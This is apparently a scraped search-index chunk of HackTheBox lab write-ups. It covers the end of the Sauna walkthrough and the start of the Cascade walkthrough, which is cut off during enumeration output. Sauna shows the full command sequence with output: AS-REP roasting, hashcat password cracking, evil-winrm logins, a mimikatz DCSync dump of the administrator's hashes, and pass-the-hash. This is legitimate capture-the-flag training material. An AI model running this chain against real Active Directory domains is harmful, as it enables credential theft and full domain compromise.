B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL |         wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL |         wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL |         wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL |         wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL |         wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL |         objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL |         isCriticalSystemObject: TRUE |         gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL;0] |         dSCorePropagationData: 1601/01/01 00:00:00 UTC |         otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL |         otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL |         masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL |         ms-DS-MachineAccountQuota: 10 |         msDS-Behavior-Version: 7 |         msDS-PerUserTrustQuota: 1 |         msDS-AllUsersTrustQuota: 1000 |         msDS-PerUserTrustTombstonesQuota: 10 |         msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL |         msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL |         msDS-NcType: 0 |         msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE |         dc: EGOTISTICAL-BANK |     dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL |     dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL |     dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL |     dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL |     dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL |     dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL |     dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL |     dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL |     dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL |     dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL |     dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL |     dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL |     dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL |_    dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done at Sat Apr  4 06:13:53 2020 -- 1 IP address (1 host up) scanned in 14.14 seconds&lt;/root&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;   As I tried a bunch of stuff using enum4linux, ldapsearch, rpcclient nothing returned out.    So I had to make my own user list from the aboutUs page from the url.     fergussmith shauncoins hugobear bowietaylor sophiedirver stevenkerb fsmith scoins hbear btaylor dsophie sophied skerb ksteven bhugo    Getting the TGT   Using GetNPUsers.py, I was able to get the TGT of a user and cracking the TGT using HASHCAT.   GetNPUsers.py -dc-ip sauna.htb -usersfile users.txt EGOTISTICAL-BANK.LOCAL/ Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation  [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:eb75b20e0b65a8f0f42c52a06403a767$0423963b218ce13f92bbca4dbab1691b0a0f390bd9070f9524c92f800f46591462f1f5271e4ac41f42bca677e7e7479de436f053f8e4373d3ef45ac872a4c0f5b9073d2f34c05b063c5bac94e9c432fc6c6ea41a15afcc30f324ffcd5137540c0847f2a5a0dadcae7491e3fda91d26c0e929f377ec97a244c291159f02fc5d723cc1f3f5dc5064a6f67ecf56a27aeaf84d005aff8ec3e476e1e1c7f5f0fb20340ec81ea50de0838bcf2489d70ca04920f312b2e7d0827106768d09ea6f07cb117d11547b8ae3752dfc8398f8cb1110332cb6f412f0610f6c3a85ad8cc680d2d61f14de3f5bf59083ed62055b4fb41f3be91b5275f2f23ae411588ac45a65ed2d [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)`    HASHCAT   Dictionary cache hit: * Filename..: D:\\Wordlist\\rockyou.txt * Passwords.: 14344387 * Bytes.....: 139921579 * Keyspace..: 14344387  $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:ff4e63efdef11ee2782d87399829857e$2109910f4bf10633f492b1b882805e4330caaa318fb715b4c04c0516f988fd06bfdeec8c2aa9a72bb8a1683ffe124e9ad6e67461be0c6ec8b423996a07217ab2c5835e1743318ab28f882f09a99ebc94409d4716cd6863e153003e62c24897b231f49daf725b7e98e3fd89d973e7c73613c9c0cafedbf341b1c93f451d5f07775ca94df35dbd858a7864e9c83182f93f88023b2ccbc8c584d7c4600a971b17614def93c8e270be2375d25717590e9c3edd83b618775dd812cd3c1c14bea8b3a6416249b9f6d5e4f9f249589c22dca0c75f4eb60fe0500ef78f72038391d2b239807f45587c3c097482d29761ff9ddd3554d6f15bf2b409a545b59d5196faa0d7:Thestrokes23 Cracking performance lower than expected?  * Append -O to the commandline.   This lowers the maximum supported password- and salt-length (typically down to 32).  * Append -w 3 to the commandline.   This can cause your screen to lag.  * Update your OpenCL runtime / driver the right way:   https://hashcat.net/faq/wrongdriver  * Create more work items to make use of your parallelization power:   https://hashcat.net/faq/morework  Session..........: hashcat Status...........: Cracked Hash.Type........: Kerberos 5 AS-REP etype 23 Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:ff4e63e...faa0d7 Time.Started.....: Sat Apr 04 16:02:10 2020 (5 secs) Time.Estimated...: Sat Apr 04 16:02:15 2020 (0 secs) Guess.Base.......: File (D:\\Wordlist\\rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........:  2001.8 kH/s (12.17ms) @ Accel:256 Loops:1 Thr:64 Vec:1 Speed.#2.........:    93174 H/s (7.22ms) @ Accel:4 Loops:1 Thr:64 Vec:1 Speed.#*.........:  2094.9 kH/s Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 10543104/14344387 (73.50%) Rejected.........: 0/10543104 (0.00%) Restore.Point....: 10455040/14344387 (72.89%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: _20003479KNL -&gt; Teague51 Candidates.#2....: a0122455276 -&gt; _2000dani Hardware.Mon.#1..: Temp: 54c Util: 27% Core: 928MHz Mem:2505MHz Bus:16 Hardware.Mon.#2..: N/A  Started: Sat Apr 04 16:01:47 2020 Stopped: Sat Apr 04 16:02:17 2020   Getting User.txt   evil-winrm -u fsmith -p Thestrokes23 -i sauna.htb  Evil-WinRM shell v2.3  Info: Establishing connection to remote endpoint  *Evil-WinRM* PS C:\\Users\\FSmith\\Documents&gt; cd .. *Evil-WinRM* PS C:\\Users\\FSmith&gt; cd Desktop *Evil-WinRM* PS C:\\Users\\FSmith\\Desktop&gt; dir      Directory: C:\\Users\\FSmith\\Desktop  Mode                LastWriteTime         Length Name ----                -------------         ------ ---- -a----        1/23/2020  10:03 AM             34 user.txt   privilege escalation   Uploading and executing winPEAS, I got some Autologin credentials.   [+] Looking for AutoLogon credentials(T1012) &lt;span style=\"color:yellow\"&gt;    Some AutoLogon credentials were found!!&lt;/span&gt;     DefaultDomainName             :  35mEGOTISTICALBANK &lt;span style=\"color:yellow\"&gt;   DefaultUserName               :  35mEGOTISTICALBANK\\svc_loanmanager&lt;/span&gt; &lt;span style=\"color:yellow\"&gt;   DefaultPassword               :  Moneymakestheworldgoround! &lt;/span&gt;   Logging in as svc_loanmanager has not worked for me. Trying in a bunch of different ways I found the user name is [svc_loanmgr].   *Evil-WinRM* PS C:\\Users\\svc_loanmgr\\Desktop&gt; whoami /all  USER INFORMATION ----------------  User Name                   SID =========================== ============================================== egotisticalbank\\svc_loanmgr S-1-5-21-2966785786-3096785034-1186376766-1108  GROUP INFORMATION -----------------  Group Name                                  Type             SID          Attributes =========================================== ================ ============ ================================================== Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group BUILTIN\\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Plus Mandatory Level Label            S-1-16-8448  PRIVILEGES INFORMATION ----------------------  Privilege Name                Description                    State ============================= ============================== ======= SeMachineAccountPrivilege     Add workstations to domain     Enabled SeChangeNotifyPrivilege       Bypass traverse checking       Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled  USER CLAIMS INFORMATION -----------------------  User claims unknown.  Kerberos support for Dynamic Access Control on this device has been disabled.   As nothing seems to be intresting from [whoami /all], I used [BloodHound] to see the structure of the domain.    Seeing svc_loanmanager having the rights of DCsync, I moved to mimikatz to dump the hash of administrator.   ./mimikatz.exe \"lsadump::dcsync /user:administrator\" \"exit\"    .#####.   mimikatz 2.2.0 (x64) #18362 Mar  8 2020 18:30:37 .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ##       &gt; http://blog.gentilkiwi.com/mimikatz '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )   '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/  mimikatz(commandline) # lsadump::dcsync /user:administrator [DC] 'EGOTISTICAL-BANK.LOCAL' will be the domain [DC] 'SAUNA.EGOTISTICAL-BANK.LOCAL' will be the DC server [DC] 'administrator' will be the user account  Object RDN           : Administrator  ** SAM ACCOUNT **  SAM Username         : Administrator Account Type         : 30000000 ( USER_OBJECT ) User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD ) Account expiration   : Password last change : 1/24/2020 10:14:15 AM Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500 Object Relative ID   : 500  Credentials:   Hash NTLM: d9485863c1e9e05851aa40cbb4ab9dff     ntlm- 0: d9485863c1e9e05851aa40cbb4ab9dff     ntlm- 1: 7facdc498ed1680c4fd1448319a8c04f     lm  - 0: ee8c50e6bc332970a8e8a632488f5211  Supplemental Credentials: * Primary:NTLM-Strong-NTOWF *     Random Value : caab2b641b39e342e0bdfcd150b1683e  * Primary:Kerberos-Newer-Keys *     Default Salt : EGOTISTICAL-BANK.LOCALAdministrator     Default Iterations : 4096     Credentials       aes256_hmac       (4096) : 987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031       aes128_hmac       (4096) : 145e4d0e4a6600b7ec0ece74997651d0       des_cbc_md5       (4096) : 19d5f15d689b1ce5     OldCredentials       aes256_hmac       (4096) : 9637f48fa06f6eea485d26cd297076c5507877df32e4a47497f360106b3c95ef       aes128_hmac       (4096) : 52c02b864f61f427d6ed0b22639849df       des_cbc_md5       (4096) : d9379d13f7c15d1c  * Primary:Kerberos *     Default Salt : EGOTISTICAL-BANK.LOCALAdministrator     Credentials       des_cbc_md5       : 19d5f15d689b1ce5     OldCredentials       des_cbc_md5       : d9379d13f7c15d1c  * Packages *     NTLM-Strong-NTOWF  * Primary:WDigest *     01  3fbea1ff422da035f1dc9b0ce45e84ea     02  708091daa9db25abbd1d94246e4257e2     03  417f2e40d5be8d436af749ed9fddb0b0     04  3fbea1ff422da035f1dc9b0ce45e84ea     05  50cb7cfb64edf83218804d934e30d431     06  781dbcf7b8f9079382a1948f26f561ee     07  4052111530264023a7d445957f5146e6     08  8f4bffc5d94cc294272cd0c836e15c47     09  0c81bc892ea87f7dd0f4a3a05b51f158     10  f8c10a5bd37ea2568976d47ef12e55b9     11  8f4bffc5d94cc294272cd0c836e15c47     12  023b04503e3eef421de2fcaf8ba1297d     13  613839caf0cf709da25991e2e5cb63cf     14  16974c015c9905fb27e55a52dc14dfb0     15  3c8af7ccd5e9bd131849990d6f18954b     16  2b26fb63dcbf03fe68b67cdd2c72b6e6     17  6eeda5f64e4adef4c299717eafbd2850     18  3b32ec94978feeac76ba92b312114e2c     19  b25058bc1ebfcac10605d39f65bff67f     20  89e75cc6957728117eb1192e739e5235     21  7e6d891c956f186006f07f15719a8a4e     22  a2cada693715ecc5725a235d3439e6a2     23  79e1db34d98ccd050b493138a3591683     24  1f29ace4f232ebce1a60a48a45593205     25  9233c8df5a28ee96900cc8b59a731923     26  08c02557056f293aab47eccf1186c100     27  695caa49e68da1ae78c1523b3442e230     28  57d7b68bd2f06eae3ba10ca342e62a78     29  3f14bb208435674e6a1cb8a957478c18  mimikatz(commandline) # exit Bye!    Getting root.txt   evil-winrm -u Administrator -H d9485863c1e9e05851aa40cbb4ab9dff -i sauna.htb   And we get the shell as administrator      If you like my work, please do consider giving me +rep on HACKTHEBOX.   My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968  ","categories": ["hackthebox"],
        "tags": ["windows,","activedirectory,","evilwinrm,","hashcat,","impacket,","bloodhound,","mimikatz,","rpcclient"],
        "url": "/hackthebox/Sauna/",
        "teaser": "/assets/img/sample/sauna.png"
      },{
        "title": "VulnHub GANANA",
        "excerpt":"    GANANA   Ganana is the very first vulnerable machine created by me and now hosted on VULNHUB. You can download the machine and play with it. Works better with Virtual-box.   This is a fairly simple machine rated easy to intermediate. There is only one flag to capture root.txt.  ","categories": ["otherposts"],
        "tags": ["linux"],
        "url": "/otherposts/Ganana/",
        "teaser": "/assets/img/sample/sauna.png"
      },{
        "title": "HackTheBox Cascade",
        "excerpt":"Info                  Cascade                               OS:       Windows                 Difficulty:       Medium                 Points:       30                 Release:       28 Mar 2020                 IP:       10.10.10.182           Let’s start hacking into CASCADE   As always hacking starts with NMAP scan.   nmap -sV -A -T4 -Pn -sC -vvv cascade.htb                                                                                                                                                                                       Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-23 02:52 EDT                                                                                                                                                                             NSE: Loaded 151 scripts for scanning.                                                                                                                                                                                                       NSE: Script Pre-scanning.                                                                                                                                                                                                                   NSE: Starting runlevel 1 (of 3) scan.                                                                                                                                                                                                       Initiating NSE at 02:52                                                                                                                                                                                                                     Completed NSE at 02:52, 0.00s elapsed                                                                                                                                                                                                       NSE: Starting runlevel 2 (of 3) scan.                                                                                                                                                                                                       Initiating NSE at 02:52                                                                                                                                                                                                                     Completed NSE at 02:52, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 02:52 Completed NSE at 02:52, 0.00s elapsed Initiating SYN Stealth Scan at 02:52 Scanning cascade.htb (10.10.10.182) [1000 ports] Discovered open port 445/tcp on 10.10.10.182 Discovered open port 53/tcp on 10.10.10.182 Discovered open port 135/tcp on 10.10.10.182 Discovered open port 139/tcp on 10.10.10.182 Discovered open port 49157/tcp on 10.10.10.182 Discovered open port 49154/tcp on 10.10.10.182 Discovered open port 3268/tcp on 10.10.10.182 Discovered open port 88/tcp on 10.10.10.182 Discovered open port 49165/tcp on 10.10.10.182 Discovered open port 636/tcp on 10.10.10.182 Discovered open port 49155/tcp on 10.10.10.182 Discovered open port 389/tcp on 10.10.10.182 Discovered open port 49158/tcp on 10.10.10.182 Discovered open port 3269/tcp on 10.10.10.182 Completed SYN Stealth Scan at 02:52, 9.90s elapsed (1000 total ports) Initiating Service scan at 02:52 Scanning 14 services on cascade.htb (10.10.10.182) Completed Service scan at 02:53, 56.75s elapsed (14 services on 1 host) Initiating OS detection (try #1) against cascade.htb (10.10.10.182) Retrying OS detection (try #2) against cascade.htb (10.10.10.182) Initiating Traceroute at 02:53 Completed Traceroute at 02:53, 0.22s elapsed Initiating Parallel DNS resolution of 2 hosts. at 02:53 Completed Parallel DNS resolution of 2 hosts. at 02:53, 13.11s elapsed DNS resolution of 1 IPs took 13.11s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0] NSE: Script scanning 10.10.10.182. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 02:53 NSE Timing: About 99.95% done; ETC: 02:54 (0:00:00 remaining) Completed NSE at 02:54, 40.20s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 02:54 NSE Timing: About 97.32% done; ETC: 02:54 (0:00:01 remaining) NSE Timing: About 98.21% done; ETC: 02:55 (0:00:01 remaining) NSE Timing: About 99.11% done; ETC: 02:55 (0:00:01 remaining) Completed NSE at 02:56, 120.90s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 02:56 Completed NSE at 02:56, 0.00s elapsed Nmap scan report for cascade.htb (10.10.10.182) Host is up, received user-set (0.18s latency). Scanned at 2020-07-23 02:52:18 EDT for 246s Not shown: 986 filtered ports Reason: 986 no-responses PORT      STATE SERVICE       REASON          VERSION 53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid:  |_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp    open  tcpwrapped    syn-ack ttl 127 135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC 139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 445/tcp   open  microsoft-ds? syn-ack ttl 127 636/tcp   open  tcpwrapped    syn-ack ttl 127 3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 3269/tcp  open  tcpwrapped    syn-ack ttl 127 49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC 49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC 49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC 49165/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|phone|specialized Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (91%) OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012 OS fingerprint not ideal because: Missing a closed TCP port so results incomplete Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (91%), Microsoft Windows Phone 7.5 or 8.0 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%) No exact OS matches for host (test conditions non-ideal). TCP/IP fingerprint: SCAN(V=7.80%E=4%D=7/23%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=5F193499%P=x86_64-pc-linux-gnu) SEQ(SP=106%GCD=1%ISR=10C%TI=I%II=I%TS=7) OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11) WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000) ECN(R=Y%DF=Y%TG=80%W=2000%O=M54DNW8NNS%CC=N%Q=) T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=) T2(R=N) T3(R=N) T4(R=N) U1(R=N) IE(R=Y%DFI=N%TG=80%CD=Z)  Uptime guess: 0.479 days (since Wed Jul 22 15:26:52 2020) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=253 (Good luck!) IP ID Sequence Generation: Incremental Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows  Host script results: |_clock-skew: 3m22s | p2p-conficker:  |   Checking for Conficker.C or higher... |   Check 1 (port 62331/tcp): CLEAN (Timeout) |   Check 2 (port 51409/tcp): CLEAN (Timeout) |   Check 3 (port 10882/udp): CLEAN (Timeout) |   Check 4 (port 53799/udp): CLEAN (Timeout) |_  0/4 checks are positive: Host is CLEAN or ports are blocked | smb2-security-mode:  |   2.02:  |_    Message signing enabled and required | smb2-time:  |   date: 2020-07-23T06:57:09 |_  start_date: 2020-07-22T19:30:40  TRACEROUTE (using port 445/tcp) HOP RTT       ADDRESS 1   184.36 ms 10.10.14.1 2   184.52 ms cascade.htb (10.10.10.182)  NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 02:56 Completed NSE at 02:56, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 02:56 Completed NSE at 02:56, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 02:56 Completed NSE at 02:56, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 248.12 seconds            Raw packets sent: 2074 (94.964KB) | Rcvd: 144 (20.275KB)   Enum4linux   enum4linux -a cascade.htb Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Jul 23 02:47:55 2020   ==========================  |    Target Information    |  ==========================  Target ........... cascade.htb RID Range ........ 500-550,1000-1050 Username ......... '' Password ......... '' Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none    ===================================================  |    Enumerating Workgroup/Domain on cascade.htb    |  ===================================================  [E] Can't find workgroup/domain    ===========================================  |    Nbtstat Information for cascade.htb    |  ===========================================  Looking up status of 10.10.10.182 No reply from 10.10.10.182   ====================================  |    Session Check on cascade.htb    |  ====================================  Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437. [+] Server cascade.htb allows sessions using username '', password '' Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451. [+] Got domain/workgroup name:    ==========================================  |    Getting domain SID for cascade.htb    |  ==========================================  Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359. Domain Name: CASCADE Domain Sid: S-1-5-21-3332504370-1206983947-1165150453 [+] Host is part of a domain (not a workgroup)   =====================================  |    OS information on cascade.htb    |  =====================================  Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458. Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464. [+] Got OS info for cascade.htb from smbclient:  Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467. [+] Got OS info for cascade.htb from srvinfo: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED   ============================  |    Users on cascade.htb    |  ============================  Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866. index: 0xee0 RID: 0x464 acb: 0x00000214 Account: a.turnbull     Name: Adrian Turnbull   Desc: (null) index: 0xebc RID: 0x452 acb: 0x00000210 Account: arksvc Name: ArkSvc    Desc: (null) index: 0xee4 RID: 0x468 acb: 0x00000211 Account: b.hanson       Name: Ben Hanson        Desc: (null) index: 0xee7 RID: 0x46a acb: 0x00000210 Account: BackupSvc      Name: BackupSvc Desc: (null) index: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: CascGuest      Name: (null)    Desc: Built-in account for guest access to the computer/domain index: 0xee5 RID: 0x469 acb: 0x00000210 Account: d.burman       Name: David Burman      Desc: (null) index: 0xee3 RID: 0x467 acb: 0x00000211 Account: e.crowe        Name: Edward Crowe      Desc: (null) index: 0xeec RID: 0x46f acb: 0x00000211 Account: i.croft        Name: Ian Croft Desc: (null) index: 0xeeb RID: 0x46e acb: 0x00000210 Account: j.allen        Name: Joseph Allen      Desc: (null) index: 0xede RID: 0x462 acb: 0x00000210 Account: j.goodhand     Name: John Goodhand     Desc: (null) index: 0xed7 RID: 0x45c acb: 0x00000210 Account: j.wakefield    Name: James Wakefield   Desc: (null) index: 0xeca RID: 0x455 acb: 0x00000210 Account: r.thompson     Name: Ryan Thompson     Desc: (null) index: 0xedd RID: 0x461 acb: 0x00000210 Account: s.hickson      Name: Stephanie Hickson Desc: (null) index: 0xebd RID: 0x453 acb: 0x00000210 Account: s.smith        Name: Steve Smith       Desc: (null) index: 0xed2 RID: 0x457 acb: 0x00000210 Account: util   Name: Util      Desc: (null)  Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881. user:[CascGuest] rid:[0x1f5] user:[arksvc] rid:[0x452] user:[s.smith] rid:[0x453] user:[r.thompson] rid:[0x455] user:[util] rid:[0x457] user:[j.wakefield] rid:[0x45c] user:[s.hickson] rid:[0x461] user:[j.goodhand] rid:[0x462] user:[a.turnbull] rid:[0x464] user:[e.crowe] rid:[0x467] user:[b.hanson] rid:[0x468] user:[d.burman] rid:[0x469] user:[BackupSvc] rid:[0x46a] user:[j.allen] rid:[0x46e] user:[i.croft] rid:[0x46f]   ========================================  |    Share Enumeration on cascade.htb    |  ========================================  Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.          Sharename       Type      Comment         ---------       ----      ------- SMB1 disabled -- no workgroup available  [+] Attempting to map shares on cascade.htb   ===================================================  |    Password Policy Information for cascade.htb    |  ===================================================    [+] Attaching to cascade.htb using a NULL share  [+] Trying protocol 445/SMB...  [+] Found domain(s):          [+] CASCADE         [+] Builtin  [+] Password Info for Domain: CASCADE          [+] Minimum password length: 5         [+] Password history length: None         [+] Maximum password age: Not Set         [+] Password Complexity Flags: 000000                  [+] Domain Refuse Password Change: 0                 [+] Domain Password Store Cleartext: 0                 [+] Domain Password Lockout Admins: 0                 [+] Domain Password No Clear Change: 0                 [+] Domain Password No Anon Change: 0                 [+] Domain Password Complex: 0          [+] Minimum password age: None         [+] Reset Account Lockout Counter: 30 minutes          [+] Locked Account Duration: 30 minutes          [+] Account Lockout Threshold: None         [+] Forced Log off Time: Not Set  Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.  [+] Retieved partial password policy with rpcclient:  Password Complexity: Disabled Minimum Password Length: 5    =============================  |    Groups on cascade.htb    |  =============================  Use of 